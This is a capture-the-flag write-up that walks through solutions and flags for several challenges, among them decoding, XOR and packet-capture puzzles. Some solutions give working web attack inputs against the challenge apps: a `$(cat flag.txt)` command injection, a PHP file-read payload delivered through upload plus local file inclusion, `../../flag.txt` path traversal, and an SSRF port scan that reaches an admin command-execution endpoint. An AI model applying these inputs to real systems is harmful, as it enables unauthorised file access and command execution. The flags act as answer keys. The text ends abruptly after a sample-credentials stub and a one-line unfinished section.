# CTF 101
This is the introductory challenge. When you download the zip file it contains a basic Flask application. Looking at the code in the `app.py` file we find the following two lines:
```
output = subprocess.check_output(f"echo {name}", shell=True, text=True, stderr=subprocess.STDOUT)
flash(f"Hello, {output.strip()}! Good luck!", "success")
```

The first line executes the input from the form directly in echo, then the output of that is sent to the return form.

## Solution
If we enter `$(cat flag.txt)` into the form, the code will execute our sub-command and send the output of the flag file to the browser for us.

Flag: flag{3b74fc0628299870edabc5072b25cf78}

---

# Screaming Crying Throwing Up
In this challenge we are provided one file: `screaming.bin`. When inspecting this file with exiftools we see the following:
```
File Name                       : screaming.bin
Directory                       : .
File Size                       : 82 bytes
File Modification Date/Time     : 2025:02:27 12:22:58-07:00
File Access Date/Time           : 2025:02:27 12:29:23-07:00
File Inode Change Date/Time     : 2025:02:27 12:22:58-07:00
File Permissions                : -rwxrwxrwx
File Type                       : TXT
File Type Extension             : txt
MIME Type                       : text/plain
MIME Encoding                   : utf-8
Byte Order Mark                 : No
Newlines                        : (none)
Line Count                      : 1
Word Count                      : 1
```

Seeing that the MIME Encoding is UTF-8 leads me to think this may be a plain text file with a .bin extension.
Running cat on the file produces this:
`a̮ăaa̋{áa̲aȧa̮ȧaa̮áa̲a̧ȧȧa̮ȧaa̲a̧aa̮ȧa̲aáa̮a̲aa̲a̮aaa̧}`

There is a hint the puzzle that this is associated with the XKCD web comic, and a quick search finds us the [Screaming Crying cypher](https://xkcd.com/3054/) It sure looks like this is what we have here. Another search found me [this encoder/decoder](https://scream-cipher.netlify.app/). Putting our cypher text into that gives us the answer.

Flag: flag{edabfbafedcbbfbadcafbdaefdadfaac}

---

# Technical Support
This is another introductory 'challenge'. All we have to do for this one is join the Snyk Discord server. In there we find a channel called `open-help-ticket`, in that channel we find a pined message that instructs us not to create a ticket, but provides us the flag.

Flag: flag{d7aa66ea0edd20221820c84ecc47aee9}

---

# Read the Rules

This is another basic introductory challenge, you are directed to a web page that has the rules of the CTF listed and given the hint: If you look closely you can even find a flag hidden on this page. If we view the source code for that page we find the flag in a comment near the bottom of the page.

Flag: flag{90bc54705794a62015369fd8e86e557b}

---

# Zero Ex Six One

For this challenge we are provided and encrypted file called `flag.txt.encry`. The file content when output with cat is: `0x070x0d0x000x060x1a0x020x540x510x050x590x530x020x510x000x530x540x070x520x040x570x550x550x050x510x560x510x530x030x550x500x050x030x050x510x590x540x000x1c`

This looks like a long string of hexadecimal characters, but most of them aren't in the standard ascii range. Some of the hints we are given:
- I'm XORta of ideas for how to get this flag.
- The name of the challenge is a bit of a hint 0x61 is the letter `a` in ascii. 

For this one I used [Cyber Chef](https://cyberchef.org/#recipe=From_Hex('0x')XOR(%7B'option':'UTF8','string':'a'%7D,'Standard',false)&input=MHgwNzB4MGQweDAwMHgwNjB4MWEweDAyMHg1NDB4NTEweDA1MHg1OTB4NTMweDAyMHg1MTB4MDAweDUzMHg1NDB4MDcweDUyMHgwNDB4NTcweDU1MHg1NTB4MDUweDUxMHg1NjB4NTEweDUzMHgwMzB4NTUweDUwMHgwNTB4MDMweDA1MHg1MTB4NTkweDU0MHgwMDB4MWM)
1. We convert the string into ascii on the delimiter of 0x
2. We XOR each character with the letter `a` from the hint in the challenge name
3. Profit!

This gives us the flag for this challenge.

Flag: flag{c50d82c0a25f3e644d0702b41dbd085a}

---

## WHO IS JH

This challenge required you to discover the vulnerabilities in a website that lets users upload evidence to support the mutli-john-hammond conspiracy. This challenge had a few layers to it.
- The flag file is in the root of the file system at `/flag.txt`
- The code for the upload page does a very basic whitelist check on the file extension to only allow .jpg, .gif. and .png file types to be uploaded.
- The upload code prepends a randomly generated unique id to the filename you supply then saves the file into the uploads directory.
- The conspiracy page accepts a language parameter that can include folder structures and it will then render the php file you specify with that parameter.

The attack angle I came up with was to:
1. Create a malicious file that has the following PHP code in it, and name the file `get_flag.php.jpg`
``` PHP
<?php echo readfile('/flag.txt') ?>
```
1. Use the language parameter on the conspiracy page to identify what the file name that was uploaded was called on the server after the unique id was added to the front.
	- `conspiracy.php?language=logs/site_log.txt`
2. Use the language parameter again to render our malicious file from the `/uploads` directory.
	- `conspiracy.php?language=uploads/<your_unique_id>_get_flag.php.jpg`
3. Profit!

Flag: flag{6558608db040d1c64358ad536a8e06c6}

---

## Free Range Packets

This challenge provides you with a packet capture from a bluetooth device that has the flag data in it.
I used Wireshark to filter down the packets to just the ones with the flag data using this filter `bluetooth and _ws.col.protocol == "L2CAP" and _ws.col.def_dst == "remote ()"` then I identified that the character in the payload byte array [9-13] contained the characters of the flag.

Next I exported only the payloads from the selected packets into a text file and using a text editor I was easily able to remove the extra data from each line and combine them together to get the flag.

Flag: flag{b5be72ab7e0254c056ffb57a0db124ce}

---

## A Powerful Shell

For this challenge we are given a powershell script. When the script is executed it tells us that we are missing the key.
``` bash
Nice
try!
But
you
need
the
magic
key!
```

Looking at the code we find a big long string that looks to be base64 encoded, and the lines that follow confirm that.

``` Powershell
# Embedded and encoded layer 2

$encoded = "JGRlY29kZWQgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdabXhoWjNzME5XUXlNMk14WmpZM09EbGlZV1JqTVRJek5EVTJOemc1TURFeU16UTFObjA9JykNCiRmbGFnID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJGRlY29kZWQpDQoNCiMgT25seSBzaG93IGZsYWcgaWYgc3BlY2lmaWMgZW52aXJvbm1lbnQgdmFyaWFibGUgaXMgc2V0DQppZiAoJGVudjpNQUdJQ19LRVkgLWVxICdTdXAzclMzY3IzdCEnKSB7DQogICAgV3JpdGUtT3V0cHV0ICRmbGFnDQp9IGVsc2Ugew0KICAgIFdyaXRlLU91dHB1dCAiTmljZSB0cnkhIEJ1dCB5b3UgbmVlZCB0aGUgbWFnaWMga2V5ISINCn0="

$bytes = [Convert]::FromBase64String($encoded)

$decodedScript = [System.Text.Encoding]::UTF8.GetString($bytes)
```

Taking that $encoded string over to Cyber Chef again and base64 decoding it give us this bit of powershell code.

``` Powershell
$decoded = [System.Convert]::FromBase64String('ZmxhZ3s0NWQyM2MxZjY3ODliYWRjMTIzNDU2Nzg5MDEyMzQ1Nn0=')
$flag = [System.Text.Encoding]::UTF8.GetString($decoded)

# Only show flag if specific environment variable is set
if ($env:MAGIC_KEY -eq 'Sup3rS3cr3t!') {
    Write-Output $flag
} else {
    Write-Output "Nice try! But you need the magic key!"
}
```

In here we find yet another string that looks to be base64 encoded. Coupled with the comment from the first file that mentioned Layer 2. We base64 decode this one and get the flag!

Flag: flag{45d23c1f6789badc1234567890123456}

---

## Time Off

In this challenge we are given access to the source code and an early build of a new time managment app that the fictional team has been building. They have asked us to see if we can find and exploit any security vulernabilities with it.

After dowloading the code and giving it a quick review I was suspicious of the file upload section that was included in the time off request functionality. When a user is creating a new time off request they have the option of uploading a file and also providing a file name. This immediately stood out to me as a potential attack vector. Once I ran the app, I logged in as a standard user and poked around at the different pieces of functionality and sure enough the time off request seemed like the best starting place. I created a new time off request and uploaded a file, then set the file name to something different than what the file was actually named. I then logged in as an Admin user and viewed the time off request, and sure enough there is a link that is created pointing to the invalid filename that I used.

Looking around the file system on the docker container I could see that the flag was stored in the root of the app directory. The system was trying to point to my fake file at `/timeoff_app/public/uploads/the_thing.jpg`. I switched back to the standard user and created a new time off request and uploaded the same file, but this time I entered `../../flag.txt` as the file name. When I switched back to the admin user and clicked on the download link for that file, initiated a download but the file name was the same as the one on the file that I uploaded, not the fake name I gave it. 

I decided to try and change the extenson of the downloaded file to .txt instead of the .png file that I had uploaded, and sure enough, the flag was there.

### Steps

1. Login as a standard user and create a new time off request.
    - Upload an empty file called `flag.txt` and enter `../../flag.txt' as the file name on the form
2. Login as an admin user and click on the link to download the file.
3. Open the file and find your flag.

Flag: flag{52948d88ee74b9bdab130c35c88bd406}

---

## Unfurl

This challenge is a basic example of the dangers of Server Side Request forgery. We are provided the code for a website that has an public interface that allows us to enter a url and it will attemp to unfurl some details about that url, including the title, description, favicon, and raw html of the page. We are also told that there is an admin portal but that it's locked down to localhost based traffic only. Looking at the code in `admin.js` we see the first step the developers took to protect thier juicy admin goods from public abuse, on app start up, it picks a random port between 1024 and 4999 to host the admin portal on. Additionally, if we look at the `adminRoutes.js` file the most dangerous function `execute` has a secondary check to ensure that if that route is executed, the request most be coming from`127.0.0.1` which would only be the case when developing locally *wink* *wink*.

The core attack vector here, is to use the url input on the publicly available unfurler page and aim it at the admin portal to get it to allow us to execute that juicy looking `execute` function. What the execute function does, is take a query parameter called `cmd` and runs it with `exec()`. So we need to trick the unfurler into calling it's own admin page, and trick it into thinking the request is coming from localhost, and finally we want it to execute `cat flag.txt` so we can get our hands on that flag.

### Solution
1. Open Burp Suite and set up the Proxy Browser to point at the public url unfurl page
2. Enter `http://127.0.0.1:1024` into the url search box and run the request. It'll likely fail because the port is wrong.
3. Right click on the request in the HTTP History tab and send it to Intruder
4. Using Intruder we can perform a Sniper attack
    - Using a positional payload on the port
    - Payload type of Numbers
    - Set the Range From: 1024 To: 4999
    - Under Settings on the attack, set the Error Handling Retries to 0. We expect most of these to fail and we don't want to waste time retrying 3 times.
5. Let that run, periodically sort your results by Status Code looking for the 200. Only one request will be a 200 and that port number is where our admin page is hosted.
6. We can now craft our final url for the unfurler using the port number we just found `http://127.0.0.1:<port>`. Ensure that the intercepter is on in your Burp Proxy and submit that url.
7. In the interceptor window find the url payload and append this to it `/execute?cmd=cat flag.txt` then forward the request.
8. In the Raw HTML section of that page you will find the flag for the taking!

Flag: flag{e1c96ccca8777b15bd0b0c7795d018ed}

---

## Weblog

### Users
admin:admin_password:admin@example.com
user1:user_password:user1@example.com

## An Offset Amongst Friends

We are provided with a compiled ELF binary. My guess is that we will need to use ghidra or similar to revers engineer this to find the flag.